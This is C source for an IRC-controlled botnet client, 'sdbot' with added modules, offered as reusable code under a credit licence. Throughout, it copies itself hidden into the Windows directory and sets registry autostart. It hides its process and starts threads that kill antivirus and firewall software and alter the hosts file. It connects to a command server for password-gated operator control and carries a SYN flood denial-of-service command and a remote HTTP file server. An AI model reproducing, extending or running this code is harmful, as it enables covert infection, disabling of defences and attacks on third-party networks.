////////////////////////////////////////////
//                                        //
//   sdbot v0.5b by [sd]                  //
//                                        //
//    email: sdbot@mail.ru                //
//      icq: 21381594                     //
//   sonork: 100.2600                     //
//      web: http://sdbot.n3.net/         //
//                                        //
//     you can use this code however      //
//     you want, as long as i'm given     //
//     credit in some way. i don't        //
//     mind if you create bots based      //
//     on this, as long as the words      //
//     'based on sdbot' are somewhere     //
//     in the program and its readme.     //
//     (the 'about' command is a good     //
//     place for this). also, no part     //
//     of this source code should be      //
//     used for illegal purposes. i       //
//     claim no responsibility for        //
//     what you do with this.             //
//                                        //
//     THIS IS ONLY A TEST RELEASE. i     //
//     make no guarantees that this       //
//     will work or that it won't         //
//     damage your computer(or anyone     //
//     else's for that matter). use        //
//     at your own risk.                  //
//                                        //
////////////////////////////////////////////

#include "Includes.h"
#include "functions.h"
#include "config.h"
#include "extern.h"

// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
 #define addpredefinedaliases() \
 	addalias("opme", "mode $chan +o $user"); \
 	addalias("smack", "action $chan smacks $1"); \
	addalias("ctcp", "raw PRIVMSG $1 :$chr(1)$2-$chr(1)");

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

// alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 // global variables
 HANDLE ih;              // internet handle
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable
 
THREAD threads[MAXTHREADS]; //new thread handles

 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[LOGSIZE][LOGLINE];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 BOOL noigcs;
 DWORD started;          // time bot was started

char myhost[256];
#ifdef _DEBUG
char logbuf[1024];
HANDLE mhStdOut;
void mDebugWindow()
{
	memset(logbuf,0,sizeof(logbuf));
	AllocConsole();
	mhStdOut=GetStdHandle(STD_OUTPUT_HANDLE);
}
#endif

 // program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA wsadata;
	int i = 0, err = 0;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	//new shit
	char logbuf[LOGLINE];
	char fname[_MAX_FNAME];
	char ext[_MAX_EXT];
	char rfilename[MAX_PATH];
	// :)
	DWORD cstat;
    HANDLE psnap;
    PROCESSENTRY32 pe32 = {0};
	int copies = 0;
	BOOL bkpserver = FALSE;

	// record start time
	started = GetTickCount() / 1000;

	LoadDLLs(); // for icmp protocal i belive

	#ifdef _DEBUG
	mDebugWindow();
	#endif

	#ifndef _DEBUG
	// hide system messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	#endif
	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

   GetWindowsDirectory(sysdir, sizeof(sysdir));
	//GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (unsigned int i=0;i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(1000); //wait for 2 sec to make sure process has fully exited 
			DeleteFile(__argv[2]);
		}
	}


		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG
	OpenConsole();
	printf("Debugging console enabled.\n\n");
	#endif

	//test removing

	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
		return 0;
	}


	srand(GetTickCount());
	if (rndfilename) rndnick(NULL,(char *)&filename,FALSE,LETTERNICK); else strncpy(filename1, filename, sizeof(filename1)-1);
#if 0
	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(2000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}
#endif
	if (regrun) AutoStartRegs(filename1);
	#ifndef NO_TASKHIDER
	taskhider();
	#endif

	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	//addthread("main thread");
	addthread("Bot started.",MAIN_THREAD,NULL);

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

    #ifndef NO_SECSYSTEM
	i=addthread("System secure monitor active.",KILLER_THREAD,NULL);
	threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, 0);
    #endif
    
    #ifndef NO_AVFW_KILL
	sprintf(logbuf,"[PROCS]: AV/FW Killer active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &kill_av, NULL, 0, 0)))
		sprintf(logbuf,"[PROCS]: Failed to start AV/FW killer thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif
    
    #ifndef NO_AVIRUS
	sprintf(logbuf,"[AVIRUS]: Anti-Virus active.");
	ChgHosts();
	removevirus();
	addlog(logbuf);
	#endif
	
	//Reg Key add Loop
	#ifndef NO_REGMON
	i=addthread("Registry monitor active.",KILLER_THREAD,NULL);
	threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&filename1, 0, 0);
	#endif

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }

// simple decrypt function, for encrypted strings
 char * decryptstr(char *str, int strlen)
 {
	if (cryptkey != 0) for (BYTE i = 0; i < strlen; i++) str[i] = str[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));
	return str;
}

// function to add a log item
 void addlog(char *desc)
 {
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
	#ifdef _DEBUG
	sprintf(logbuf,"%s\n",log[0]);
	WriteFile(mhStdOut, logbuf, strlen(logbuf), NULL, NULL);
	#endif
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD err;
	int rval;
	char *nick1, nick[MAXNICKLEN];
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		memset(nick, 0, sizeof(nick));

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}
		if (irc.spy == 1) nick1 = irc.nick; else {
			nick1 = rndnick(sock,nick, nicktype, nickprefix);
		}
		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;
	}

	clearthread(irc.threadnum);
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }


// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
{
	// main receive buffer
	char buff[4096], masters[maxlogins][128], *line[IRCLINE], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;
	for (i = 0; i < maxlogins; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		sprintf(login,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, nick1, nick1);

	
	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}


	// loop forever
	while(1) {
		memset(buff, 0, sizeof(buff));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buff, sizeof(buff), 0) <= 0) 
			break;



		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line		
		i=Split(buff,&line);
		for (j=0;j<i;j++) {
			repeat=1;
			do {
				repeat=irc_parseline(line[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat);
				repeat--;
				//if (repeat > 0)
				//	Sleep(FLOOD_DELAY);
			} while (repeat>0);
		         if (repeat==-1) return 0;	//Reconnect 
		         else if (repeat==-2) return 1;	//Disconnect
		         else if (repeat==-3) return 2;	//Quit      
                   	}                                                   
                                                            
                }                                                           
                                                            
                return 0;  
        }                                                 

	//		switch (repeat) {
	//		case -1:
	//			return 0; // Reconnect
	//		case -2:
	//			return 1; // Disconnect
	//		case -3:
	//			return 2; // Quit
	//		default:
	//			break;
	//		}
	//	}
	//}
        //
	//return 0;


// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat)
 {
	char line1[IRCLINE];
	char line2[IRCLINE];
	//char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[IRCLINE];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;
	unsigned char parameters[256];

	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	//for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}

	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}


   // pong if we get a ping request from the server 
   if (strcmp("PING", a[0]) == 0) { 
	   a[0][1]='0';
      //irc_sendf(sock, "PONG %s\r\n", a[1]); 
      irc_sendf(sock, "PONG %s\r\n", a[1]+1); 
      if (*in_channel == 0) { 
         irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass); 
      } 
      return 1; 
   } 

   if (strcmp("NOTICE", a[1]) == 0) { 
      if (a[18]) 
      { 
         if (strcmp("pong", a[17]) == 0) 
         { 
            irc_sendf(sock, "PONG %s\r\n", a[18]); 
            //irc_sendf(sock, "PONG %s\r\n", a[1]); 
            if (in_channel == 0) { 
               irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass); 
            } 
         } 
      } 
      return 1; 
   } 

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) { 
			strncpy(host,  h+1, 159);
			strncpy(myhost,h+1,255);
		}
		return 1;
	}

	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		rndnick(sock,nick1,nickprefix,nicktype);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}
	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) ismaster = TRUE;

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"user %s logged out.", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "screw you %s!", user);
			irc_privmsg(sock, a[2], sendbuf, FALSE);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		if(oldnck != NULL && newnck != NULL) {
		    if(strcmp(oldnck, nick1) == 0) {
			    strncpy(nick1, newnck, 15);
			    return 1;
			}
		    char debugbuf[100];
			for (i = 0; i < maxlogins; i++) {
			    if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
		return 1;
	}

	// POINT if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL || notice) a[2] = user; 
			if (a[3] == NULL) return 1; 
			a[3]++; 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3; 
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise. 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3; 

			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		if (strcmp(slogin, a[s]) == 0)
		{
			if (a[s+1] == NULL) return 1;
			//if (ismaster || strstr(a[2], "#") == NULL) return 1;

			char *u = strtok(a[0], "!") + 1;
			char *h = strtok(NULL, "\0");

			if (strcmp(password, a[s+1]) != 0)
			{
				//irc_sendf(sock, "NOTICE %s :pass auth failed.\r\n", user);
				//irc_sendf(sock, "NOTICE %s :your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "*failed pass auth by %s(%s).", u, h);
				addlog(sendbuf);
				return 1;
			}
			if (!HostMaskMatch(h))
			{
				//irc_sendf(sock, "NOTICE %s :host auth failed.\r\n", user);
				//irc_sendf(sock, "NOTICE %s :your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "*failed host auth by %s(%s).", u, h);
				addlog(sendbuf);
				return 1;
			}
			for(i = 0; i < maxlogins; i++)
			{
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0)
				{
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "password accepted.", notice);
					sprintf(sendbuf, "user %s(%s) logged in.", u, h);
					addlog(sendbuf);
					break;
				}
			}
		return 1;
		}
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(sock,ntmp,nickprefix,nicktype)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(sock,nick,nickprefix,nicktype);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
				       //add by scorpiono
			else if (strcmp("synflood", a[s]) == 0 || strcmp("syn", a[s]) == 0) {
				SYNFLOOD synflood;
				strncpy(synflood.ip, a[s+1], sizeof(synflood.ip)-1);
				strncpy(synflood.port, a[s+2], sizeof(synflood.port)-1);
				strncpy(synflood.length, a[s+3], sizeof(synflood.length)-1);
				strncpy(synflood.chan, a[2], sizeof(synflood.chan)-1);
				synflood.notice = notice;
				synflood.silent = silent;
				synflood.sock = sock;

				sprintf(sendbuf, "[SYN]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
				synflood.threadnum = addthread(sendbuf,SYN_THREAD,NULL);
				if (threads[synflood.threadnum].tHandle = CreateThread(NULL, 0, &SynFloodThread, (LPVOID)&synflood, 0, &id)) {
					while(synflood.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[SYN]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
	//ROSE UPTIME START
			//adding uptime shit, long time no .uptime
			else if (strcmp("uptime",a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000);
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, "Uptime: %dd %dh %dm", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("nickupcheck",a[s]) == 0) {
				DWORD total, days;
				total = (GetTickCount() / 1000);
			    days = total / 86400;
				if (days>1) {
					sprintf(sendbuf,"NICK [%dd]Server\r\n", days); 
					irc_send(sock,sendbuf);
				}
			}
/*		else if (strcmp("upcheck",a[s]) == 0) {
				DWORD total, days;
				total = (GetTickCount() / 1000);
			    days = total / 86400;
				if (days>=a[s+1]) {
					sprintf(sendbuf, "Rose1.1: %d days", days);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}*/
			//ROSE UPTIME FINISH
            //finish
			//HTTP SERVER ADDED
			else if (strcmp("httpserver", a[s]) == 0 || strcmp("http", a[s]) == 0) {
				HTTPD httpd;
				httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
				httpd.enabled = ((parameters['d'])?(FALSE):(TRUE));
				if (a[s+2])
					sprintf(httpd.dir, a[s+2]);
				else {
					char sysdir[MAX_PATH], drive[10];
					GetSystemDirectory(sysdir,sizeof(sysdir));
					_splitpath(sysdir, drive, NULL, NULL, NULL);
				}
				if (httpd.dir[strlen(httpd.dir)-1] == 92) 
					httpd.dir[strlen(httpd.dir)-1] = '\0';
				httpd.sock = sock;
				_snprintf(httpd.chan, sizeof(httpd.chan), a[2]);
				httpd.notice = notice;
				httpd.silent = silent;

				sprintf(sendbuf,"[HTTPD]: Server listening on IP: %s:%d, Directory: %s\\.", GetIP(sock), httpd.port, httpd.dir);
				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {	
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[HTTPD]: Failed to start server thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("httpstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[HTTPD]","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("httpcon",a[s]) == 0 || strcmp("hcon",a[s]) == 0) { 
				HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
